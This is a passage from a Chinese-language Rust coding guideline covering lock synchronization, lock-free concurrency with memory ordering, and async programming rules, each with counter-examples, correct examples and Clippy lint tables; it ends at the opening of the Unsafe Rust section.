<div style="break-before: page; page-break-before: always;"></div><h1 id="锁同步"><a class="header" href="#锁同步">锁同步</a></h1>
<p>Rust 中多线程并发使用锁来进行线程同步。</p>
<h2 id="列表-8"><a class="header" href="#列表-8">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/threads/./lock/P.MTH.LCK.01.html">P.MTH.LCK.01 多线程下要注意识别锁争用的情况，避免死锁</a></li>
<li><a href="safe-guides/coding_practice/threads/./lock/G.MTH.LCK.01.html">G.MTH.LCK.01 对布尔或引用并发访问应该使用原子类型而非互斥锁</a></li>
<li><a href="safe-guides/coding_practice/threads/./lock/G.MTH.LCK.02.html">G.MTH.LCK.02 建议使用 <code>Arc&lt;str&gt; / Arc&lt;[T]&gt;</code> 来代替 <code>Arc&lt;String&gt; / Arc&lt;Vec&lt;T&gt;&gt;</code></a></li>
<li><a href="safe-guides/coding_practice/threads/./lock/G.MTH.LCK.03.html">G.MTH.LCK.03 尽量避免直接使用标准库 <code>std::sync</code> 模块中的同步原语，替换为 <code>parking_lot</code></a></li>
<li><a href="safe-guides/coding_practice/threads/./lock/G.MTH.LCK.04.html">G.MTH.LCK.04 尽量避免直接使用标准库 <code>std::sync::mpsc</code> 模块中的 <code>channel</code>，替换为 <code>crossbeam</code></a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmthlck01-多线程下要注意识别锁争用的情况避免死锁"><a class="header" href="#pmthlck01-多线程下要注意识别锁争用的情况避免死锁">P.MTH.LCK.01 多线程下要注意识别锁争用的情况，避免死锁</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 并不能保证没有死锁，要注意 <code>LockResult&lt;MutexGuard&lt;'_, T&gt;&gt;</code> 的生命周期，以防止出现死锁的情况。</p>
<p><strong>【反例】</strong></p>
<p>下面代码有一定的几率会触发死锁。</p>
<pre><pre class="playground"><code class="language-rust">// 触发死锁时，只会输出：
// Thread 1 holds a lock and starts waiting b lock
// Thread 2 hodls a lock and starts waiting a lock

use std::sync::{Arc, Mutex};
use std::thread;

fn main() {
    let a = Arc::new(Mutex::new(0));
    let b = Arc::new(Mutex::new(0));
    let mut handles = vec![];

    {
        let a = Arc::clone(&amp;a);
        let b = Arc::clone(&amp;b);
        let handle = thread::spawn(move || {
            let mut a_num = a.lock().unwrap();
            *a_num += 1;
            println!(&quot;Thread 1 holds a lock and starts waiting b lock&quot;);
            let mut b_num = b.lock().unwrap();
            *b_num += 1;
        });
        handles.push(handle);
    }
    {
        let a = Arc::clone(&amp;a);
        let b = Arc::clone(&amp;b);
        let handle = thread::spawn(move || {
            let mut b_num = b.lock().unwrap();
            *b_num += 1;
            println!(&quot;Thread 2 holds b lock and starts waiting a lock&quot;);
            let mut a_num = a.lock().unwrap();
            *a_num += 1;
            println!(&quot;Thread 2&quot;);
        });
        handles.push(handle);
    }
    for handle in handles {
        handle.join().unwrap();
    }

    println!(&quot;Done {}&quot;, *a.lock().unwrap()); // never reach here
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 无死锁发生，正常输出
// Thread 1 holds a lock and starts waiting b lock
// Thread 2 hodls a lock and starts waiting a lock
// Thread 2
// Done 2

use std::sync::{Arc, Mutex};
use std::thread;

fn main() {
    let a = Arc::new(Mutex::new(0));
    let b = Arc::new(Mutex::new(0));
    let mut handles = vec![];

    {
        let a = Arc::clone(&amp;a);
        let b = Arc::clone(&amp;b);
        let handle = thread::spawn(move || {
            {   // &lt;- 这里增加显示作用域，确保 lock 之后可以自动解锁
                // 即 LockResult&lt;MutexGuard&lt;'_, T&gt;&gt; 在作用域之外会自动释放
                let mut a_num = a.lock().unwrap();
                *a_num += 1;
                println!(&quot;Thread 1 holds a lock and starts waiting b lock&quot;);
            }
            {   // &lt;- 这里增加显示作用域，确保 lock 之后可以自动解锁
                // 即 LockResult&lt;MutexGuard&lt;'_, T&gt;&gt; 在作用域之外会自动释放
                let mut b_num = b.lock().unwrap();
                *b_num += 1;
            }
        });
        handles.push(handle);
    }
    {
        let a = Arc::clone(&amp;a);
        let b = Arc::clone(&amp;b);
        let handle = thread::spawn(move || {
            {   // &lt;- 这里增加显示作用域，确保 lock 之后可以自动解锁
                // 即 LockResult&lt;MutexGuard&lt;'_, T&gt;&gt; 在作用域之外会自动释放
                let mut b_num = b.lock().unwrap();
                *b_num += 1;
                println!(&quot;Thread 2 holds b lock and starts waiting a lock&quot;);
            }
            {   // &lt;- 这里增加显示作用域，确保 lock 之后可以自动解锁
                // 即 LockResult&lt;MutexGuard&lt;'_, T&gt;&gt; 在作用域之外会自动释放
                let mut a_num = a.lock().unwrap();
                *a_num += 1;
            }
            println!(&quot;Thread 2&quot;);
        });
        handles.push(handle);
    }
    for handle in handles {
        handle.join().unwrap();
    }

    println!(&quot;Done {}&quot;, *a.lock().unwrap());
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmthlck01-对布尔或引用并发访问应该使用原子类型而非互斥锁"><a class="header" href="#gmthlck01-对布尔或引用并发访问应该使用原子类型而非互斥锁">G.MTH.LCK.01 对布尔或引用并发访问应该使用原子类型而非互斥锁</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>使用原子类型性能更好。但要注意指定合理的内存顺序。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
let x = Mutex::new(&amp;y);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let x = AtomicBool::new(y);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#mutex_atomic">mutex_atomic</a></td><td>yes</td><td>no</td><td>perf</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmthlck02-宜使用-arcstr--arct-来代替--arcstring--arcvect"><a class="header" href="#gmthlck02-宜使用-arcstr--arct-来代替--arcstring--arcvect">G.MTH.LCK.02 宜使用 <code>Arc&lt;str&gt; / Arc&lt;[T]&gt;</code> 来代替  <code>Arc&lt;String&gt; / Arc&lt;Vec&lt;T&gt;&gt;</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p><code>Arc&lt;str&gt; / Arc&lt;[T]&gt;</code> 的性能比  <code>Arc&lt;String&gt; / Arc&lt;Vec&lt;T&gt;&gt;</code> 更好。</p>
<p>因为 ：</p>
<ul>
<li><code>Arc&lt;String&gt; / Arc&lt;Vec&lt;T&gt;&gt;</code> 有一层中间层： <code>arc -&gt; String len/Vec&lt;T&gt; len -&gt; text/data</code>，它是一个薄指针（thin pointer）。</li>
<li><code>Arc&lt;str&gt;/ Arc&lt;[T]&gt;</code> 则没有中间层： <code>arc &amp; string len / [T] len -&gt; text/data</code>，它是一个胖指针（fat pointer）。</li>
</ul>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::rc::Rc;
use std::sync::Arc;

fn main() {
    let a = &quot;hello world&quot;.to_string();
    let b: Rc&lt;String&gt; = Rc::from(a); // 不符合
    println!(&quot;{}&quot;, b);

    let a = &quot;hello world&quot;.to_string();
    let b: Rc&lt;String&gt; = a.into(); // 不符合
    println!(&quot;{}&quot;, b);

    let a = &quot;hello world&quot;.to_string();
    let b: Arc&lt;String&gt; = Arc::from(a); // 不符合
    println!(&quot;{}&quot;, b);
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::rc::Rc;
use std::sync::Arc;

fn main() {
    let a: &amp;str = &quot;hello world&quot;;
    let b: Rc&lt;str&gt; = Rc::from(a); // 符合
    println!(&quot;{}&quot;, b);

    let b: Rc&lt;str&gt; = a.into(); // 符合
    println!(&quot;{}&quot;, b);

    let a: &amp;str = &quot;hello world&quot;;
    let b: Arc&lt;str&gt; = Arc::from(a); // 符合
    println!(&quot;{}&quot;, b);
}
</code></pre></pre>
<p><strong>【例外】</strong></p>
<p>参考：<a href="https://github.com/rust-lang/rust-clippy/pull/6044#issuecomment-699565080">https://github.com/rust-lang/rust-clippy/pull/6044#issuecomment-699565080</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: https://github.com/Fishrock123/surf/blob/master/src/client.rs#L33

pub struct Client {
    http_client: Arc&lt;dyn HttpClient&gt;,
    /// Holds the middleware stack.
    // 业务上必须要求持有一个 Vec 才能保证用户正常添加中间件
    middleware: Arc&lt;Vec&lt;Arc&lt;dyn Middleware&gt;&gt;&gt;,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#rc_buffer">rc_buffer</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmthlck03-尽量避免直接使用标准库-stdsync-模块中的同步原语替换为-parking_lot"><a class="header" href="#gmthlck03-尽量避免直接使用标准库-stdsync-模块中的同步原语替换为-parking_lot">G.MTH.LCK.03 尽量避免直接使用标准库 <code>std::sync</code> 模块中的同步原语，替换为 <a href="https://crates.io/crates/parking_lot"><code>parking_lot</code></a></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>尽量避免对标准库 <code>std::sync</code> 模块中锁同步原语的使用，建议使用 <a href="https://crates.io/crates/parking_lot"><code>parking_lot</code></a> 的实现。</p>
<p><strong>【反例】</strong></p>
<p>来源于 <a href="https://doc.rust-lang.org/std/sync/struct.Mutex.html">std标准库文档</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
use std::sync::{Arc, Mutex};
use std::thread;
use std::sync::mpsc::channel;

const N: usize = 10;

let data = Arc::new(Mutex::new(0));

let (tx, rx) = channel();
for _ in 0..N {
    let (data, tx) = (Arc::clone(&amp;data), tx.clone());
    thread::spawn(move || {      
        let mut data = data.lock().unwrap();
        *data += 1;
        if *data == N {
            tx.send(()).unwrap();
        }
    });
}

rx.recv().unwrap();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>例子来源于 <a href="https://docs.rs/parking_lot/0.11.2/parking_lot/type.Mutex.html">parking_lot 文档</a></p>
<p>相比<code>std::sync::Mutex</code>，使用 <code>parking_lot::Mutex</code> 能实现'无中毒'，锁在 panic 时正常释放，更少的空间占用等优势。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
use parking_lot::Mutex;
use std::sync::{Arc, mpsc::channel};
use std::thread;

const N: usize = 10;

let data = Arc::new(Mutex::new(0));

let (tx, rx) = channel();
for _ in 0..10 {
    let (data, tx) = (Arc::clone(&amp;data), tx.clone());
    thread::spawn(move || {
        let mut data = data.lock();
        *data += 1;
        if *data == N {
            tx.send(()).unwrap();
        }
    });
}

rx.recv().unwrap();
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmthlck04-尽量避免直接使用标准库-stdsyncmpsc-模块中的-channel替换为-crossbeam"><a class="header" href="#gmthlck04-尽量避免直接使用标准库-stdsyncmpsc-模块中的-channel替换为-crossbeam">G.MTH.LCK.04 尽量避免直接使用标准库 <code>std::sync::mpsc</code> 模块中的 <code>channel</code>，替换为 <a href="https://github.com/crossbeam-rs/crossbeam"><code>crossbeam</code></a></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>尽量避免使用 <code>std::sync::mpsc::channel</code>，建议使用 <a href="https://github.com/crossbeam-rs/crossbeam"><code>crossbeam</code></a></p>
<p><strong>【反例】</strong></p>
<p>例子来源于 <a href="https://doc.rust-lang.org/std/sync/mpsc/"><code>std::sync::mpsc</code> 文档</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::thread;
use std::sync::mpsc::channel; // 不符合

let (tx, rx) = channel();

for i in 0..10 {
    let tx = tx.clone();
    thread::spawn(move|| {
        tx.send(i).unwrap();
    });
}

for _ in 0..10 {
    let j = rx.recv().unwrap();
    assert!(0 &lt;= j &amp;&amp; j &lt; 10);
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use crossbeam_channel::unbounded; // 符合

let (tx, rx) = unbounded();

for i in 0..10 {
    let tx = tx.clone();
    thread::spawn(move|| {
        tx.send(i).unwrap();
    });
}

for _ in 0..10 {
    let j = rx.recv().unwrap();
    assert!(0 &lt;= j &amp;&amp; j &lt; 10);
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="无锁并发"><a class="header" href="#无锁并发">无锁并发</a></h1>
<p>Rust 也支持原子类型，其内存顺序模型与 <code>C++20</code> 相同。</p>
<h2 id="列表-9"><a class="header" href="#列表-9">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/threads/./lock-free/P.MTH.LKF.01.html">P.MTH.LKF.01 除非必要，否则建议使用同步锁</a></li>
<li><a href="safe-guides/coding_practice/threads/./lock-free/P.MTH.LKF.02.html">P.MTH.LKF.02 使用无锁编程时，需要合理选择内存顺序</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmthlkf01-除非必要否则建议使用同步锁"><a class="header" href="#pmthlkf01-除非必要否则建议使用同步锁">P.MTH.LKF.01 除非必要，否则建议使用同步锁</a></h2>
<p><strong>【描述】</strong></p>
<p>无锁编程性能不一定比同步锁高。</p>
<p>使用无锁编程时需要注意的地方比使用同步锁多，比如指令重排、ABA 问题、内存顺序是否指定正确等。
正确实现无锁编程比使用同步锁要困难很多。所以，除非必要，否则直接使用同步锁就可以。</p>
<p>也有一些 <a href="https://github.com/magiclen/rust-performance-measurement/blob/master/benches/atomic_mutex.rs">性能测试</a> 作为参考，原子类型的性能比互斥锁的性能大概要好四倍左右。所以，当在同一个临界区内要有超过四次原子操作，也许使用互斥锁更加简单一些。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmthlkf02-使用无锁编程时需要合理选择内存顺序"><a class="header" href="#pmthlkf02-使用无锁编程时需要合理选择内存顺序">P.MTH.LKF.02 使用无锁编程时，需要合理选择内存顺序</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 原子类型使用 <a href="https://zh.cppreference.com/w/cpp/atomic/memory_order"><code>C++20</code> 的内存顺序模型</a> 来指定原子操作的内存同步方式，但也不是完全采用此模型。</p>
<p>目前 Rust 引入五种内存顺序：<code>Relaxed / Release / Acquire / AcqRel / SeqCst</code>。</p>
<p>在无锁编程中，指定正确的内存顺序是很重要很复杂的一件事，这里有一些建议：</p>
<ol>
<li>如果对程序中的原子类型同步方式的判断没有太多信息，建议使用 <code>SeqCst</code>，它表示顺序一致性，会强制所有线程都同意程序指令以单一全局线性的方式来执行。这样可以保证安全性，但性能有一定损失。</li>
<li>如果对无锁实现中线程间发生的数据竞争带来的后果不是特别关心，则可以放心使用 <code>Relaxed</code>，因为它性能最好。</li>
<li>当多个线程之间操作内存中同一个位置有因果关系时，适合使用 <code>Acquire / Release / AcqRel</code> 来配对。比如，线程 A 写 (<code>Release</code>) 内存中的一个位置，然后线程 B 随后读 (<code>Acquire</code>) 内存中一个相同的位置，就会产生一个因果关系，所以为了保证 A 的每次写入都能在 B 读取之前被观察到。如果 A 和 B 访问不同内存位置，则没有因果关系。</li>
</ol>
<p><strong>【正例】</strong></p>
<p>自旋锁中 <code>Acquire / Release</code> 搭配使用的简易示例：</p>
<pre><pre class="playground"><code class="language-rust">use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;

fn main() {
    let lock = Arc::new(AtomicBool::new(false)); // 这个原子类型的值用来表示 &quot;是否获取到锁&quot;

    // ... distribute lock to threads somehow ...

    // 线程 A 尝试通过设置为 ture 来获取锁
    //
    // Acquire 内存顺序:
    // 当与 load 结合使用时，若 load 的值是由具有 Release (或更强) 排序的 store 操作写入的，则所有后续操作
    // 都将在该 store 之后进行排序。特别是，所有后续load都将看到在 store 之前写入的数据。
    while lock.compare_and_swap(false, true, Ordering::Acquire) { }
    // 在循环外，意味着已经拿到了锁！

    // ...访问/操作数据...

    // 线程A完成了数据操作，释放锁。
    // 此处用 Release 内存顺序可以确保线程B在获取锁时能看到线程A释放了锁（对内存写入 false）
    //
    // Release 内存顺序：
    // 当与 store 结合使用时，所有先前的操作都会在使用 Acquire（或更强）排序的任何 load 此值之前排序。
    // 特别是，所有先前的写入对执行 Acquire 此值（或更强）load 的线程都可见。
    lock.store(false, Ordering::Release);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="318-异步编程"><a class="header" href="#318-异步编程">3.18 异步编程</a></h1>
<p><code>async / await</code> 是 Rust 语言用于编写像同步代码一样的异步函数的内置工具。<code>async</code> 将一个代码块转化为一个实现了名为 <code>Future</code> 的特质 (trait)
的状态机。虽然在同步方法中调用阻塞函数会阻塞整个线程，但阻塞的 <code>Future</code> 将让出线程控制权，允许其他 <code>Future</code> 运行。</p>
<p>Rust 异步编程需要依赖于异步运行时，生产环境中比较推荐的开源异步运行时是 <a href="https://github.com/tokio-rs/tokio">Tokio</a>。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pasy01-异步编程并不适合所有场景计算密集型场景应该考虑同步编程"><a class="header" href="#pasy01-异步编程并不适合所有场景计算密集型场景应该考虑同步编程">P.ASY.01 异步编程并不适合所有场景，计算密集型场景应该考虑同步编程</a></h2>
<p><strong>【描述】</strong></p>
<p>异步编程适合 I/O 密集型应用，如果是计算密集型场景应该考虑使用同步编程。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gasy01-在-async-块或函数中调用-async-函数或闭包请不要忘记添加await"><a class="header" href="#gasy01-在-async-块或函数中调用-async-函数或闭包请不要忘记添加await">G.ASY.01 在 <code>async</code> 块或函数中调用 <code>async</code> 函数或闭包请不要忘记添加<code>.await</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在此条件下 <code>.await</code> 语句通常为必须的。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>async fn foo() {}

fn bar() {
  let x = async {
    foo() // 不符合
  };
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>async fn foo() {}

fn bar() {
  let x = async {
    foo().await // 符合
  };
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#async_yields_async">async_yields_async</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gasy02-在跨-await-调用中需要对其持有的同步互斥锁进行处理"><a class="header" href="#gasy02-在跨-await-调用中需要对其持有的同步互斥锁进行处理">G.ASY.02 在跨 <code>await</code> 调用中，需要对其持有的同步互斥锁进行处理</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>同步互斥锁本来就不是为异步上下文跨 <code>await</code> 调用而设计的，在这种场景中使用同步互斥锁容易造成死锁。当同步互斥锁被跨 <code>await</code> 时，有可能很长时间都不会返回这个调用点，在其他任务中再次用到这个互斥锁的时候，容易造成死锁。</p>
<p>这里有两种解决方案：</p>
<ol>
<li>使用异步互斥锁。但是异步互斥锁的开销要大于同步互斥锁。</li>
<li>确保同步互斥锁在调用 <code>await</code> 之前已经释放。</li>
</ol>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::await_holding_lock)] 
<span class="boring">fn main() {
</span>use std::sync::Mutex;

async fn foo(x: &amp;Mutex&lt;u32&gt;) {
  let mut guard = x.lock().unwrap();
  *guard += 1;
  baz().await; // 不符合
}

<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::await_holding_lock)] 

use std::sync::Mutex;
// 使用同步互斥锁
async fn foo(x: &amp;Mutex&lt;u32&gt;) {
    {
        let guard = x.lock().unwrap();
        *guard += 1;
    } // 符合：await 之前先释放锁
    bar.await;
}

// 使用异步互斥锁
use tokio::sync::Mutex;
use std::sync::Arc;

#[tokio::main]
async fn main() {
    // 使用 Arc 允许跨线程共享 Mutex
    let count = Arc::new(Mutex::new(0));

    for i in 0..5 {
        let my_count = Arc::clone(&amp;count);
        tokio::spawn(async move {
            for j in 0..10 {
                // 符合：这里的 lock 在每次迭代后都会被释放
                let mut lock = my_count.lock().await;
                *lock += 1;
                println!(&quot;{} {} {}&quot;, i, j, lock);
            }
        });
    }

    loop {
        // 符合：这里的 lock 在每次迭代后都会被释放
        if *count.lock().await &gt;= 50 {
            break;
        }
    }
    println!(&quot;Count hit 50.&quot;);
}
</code></pre></pre>
<p><strong>【例外】</strong></p>
<p>用例来源：<a href="https://github.com/khonsulabs/kludgine/blob/dafc1b5bab10702265cdd1d8ab210ce882d0f998/app/src/runtime/smol.rs#L31">kludgine</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Launch a thread pool
std::thread::spawn(|| {
    let (signal, shutdown) = flume::unbounded::&lt;()&gt;();

    easy_parallel::Parallel::new()
        // Run four executor threads.
        .each(0..4, |_| {
            #[allow(clippy::await_holding_lock)] // 这里是 读写锁，不是互斥锁
            futures::executor::block_on(async {
                let guard = GLOBAL_THREAD_POOL.read(); // 获取读写锁的读锁，不会出现锁争用情况，所以是线程安全的
                let executor = guard.as_ref().unwrap();
                executor.run(shutdown.recv_async()).await
            })
        })
        // Run the main future on the current thread.
        .finish(|| {});

    drop(signal);
});
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#await_holding_lock">await_holding_lock</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gasy03-在跨-await-调用中需要对其持有-refcell-的引用进行处理"><a class="header" href="#gasy03-在跨-await-调用中需要对其持有-refcell-的引用进行处理">G.ASY.03 在跨 <code>await</code> 调用中，需要对其持有 <code>RefCell</code> 的引用进行处理</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>使用 <code>RefCell</code> 的独占（可变）借用会导致 Panic。因为 <code>RefCell</code> 是运行时检查独占的可变访问，如果跨 <code>await</code> 持有一个可变引用则可能会因为共享的可变引用而引起 Panic。</p>
<p>这种共享可变在编译期是无法被检查出来的。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::await_holding_refcell_ref)] 

<span class="boring">fn main() {
</span>use std::cell::RefCell;

async fn foo(x: &amp;RefCell&lt;u32&gt;) {
  let mut y = x.borrow_mut();
  *y += 1;
  baz().await; // 不符合
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::await_holding_refcell_ref)] 

<span class="boring">fn main() {
</span>use std::cell::RefCell;

async fn foo(x: &amp;RefCell&lt;u32&gt;) {
  {
    let mut y = x.borrow_mut();
    *y += 1;
  }
  baz().await; // 符合
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>跨 <code>await</code> 持有 <code>RefCell</code> 的可变借用，但是当前场景确信永远不会 Panic，则可以使用。</p>
<p>用例来源：<a href="https://github.com/MattiasBuelens/wasm-streams/blob/dff05d77513cc1d590c21cd251a63b43cf520fed/src/readable/into_underlying_byte_source.rs#L65">wasm-streams</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn pull(&amp;mut self, controller: sys::ReadableByteStreamController) -&gt; Promise {
  let inner = self.inner.clone();
  let fut = async move {
    // 这个可变借用永远不会恐慌，因为 ReadableStream 对底层源的每个操作总是有序的。
    let mut inner = inner.try_borrow_mut().unwrap_throw();
    inner.pull(controller).await
  };
  // ...
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#await_holding_refcell_ref">await_holding_refcell_ref</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gasy04-避免定义不必要的异步函数"><a class="header" href="#gasy04-避免定义不必要的异步函数">G.ASY.04 避免定义不必要的异步函数</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>如果一个异步函数内部没有任何异步代码，相比一个同步函数，它会产生额外的调用成本。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
#[warn(clippy::unused_async)]
async fn add(value: i32) -&gt; i32 {
    value + 1 
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
#[warn(clippy::unused_async)]
fn add(value: i32) -&gt; i32 {
    value + 1
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#unused_async">unused_async</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gasy05--避免在异步处理过程中包含阻塞操作"><a class="header" href="#gasy05--避免在异步处理过程中包含阻塞操作">G.ASY.05  避免在异步处理过程中包含阻塞操作</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>避免在异步编程中使用阻塞操作。</p>
<p><strong>【反例】</strong></p>
<p>不要在异步流程中使用阻塞操作函数</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::error::Error;
use std::{fs, io};
    
async fn read_file() -&gt; Result&lt;String, std::io::Error&gt; {
    fs::read_to_string(&quot;test.txt&quot;) // 不符合
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>使用异步运行时，如tokio提供的非阻塞函数</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::fs;

async fn read_file() -&gt; std::io::Result&lt;()&gt; {
    let _ = fs::read_to_string(&quot;test.txt&quot;).await?; // 符合
    Ok(())
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="319-unsafe-rust"><a class="header" href="#319-unsafe-rust">3.19 Unsafe Rust</a></h1>
<p>Unsafe Rust 是 Safe Rust 的超集，意味着在 Unsafe Rust 中也会有 Safe Rust的安全检查。但是 Unsafe Rust 中下面五件事是Safe Rust 的检查鞭长莫及的地方：</p>
<ol>
<li>解引用裸指针</li>
<li>调用 <code>unsafe</code>函数（C函数，编译器内部函数或原始分配器）</li>
<li>实现 <code>unsafe</code> trait</li>
<li>可变静态变量</li>
<li>访问  <code>union</code> 的字段</li>
</ol>
<p>使用 Unsafe Rust 的时候，需要遵守一定的规范，这样可以避免未定义行为的发生。</p>
<p>关于 Unsafe Rust 下的一些专用术语可以查看 <a href="safe-guides/coding_practice/./unsafe_rust/glossary.html">Unsafe 代码术语指南</a> 。</p>
<p><strong>Unsafe Rust 的语义：这是编译器无法保证安全的地方，需要程序员来保证安全。</strong> </p>
<p><a href="safe-guides/coding_practice/./unsafe_rust/glossary.html">Unsafe 代码术语指南</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="puns01--不要为了逃避编译器安全检查而滥用-unsafe-rust"><a class="header" href="#puns01--不要为了逃避编译器安全检查而滥用-unsafe-rust">P.UNS.01  不要为了逃避编译器安全检查而滥用 Unsafe Rust</a></h2>
<p><strong>【描述】</strong></p>
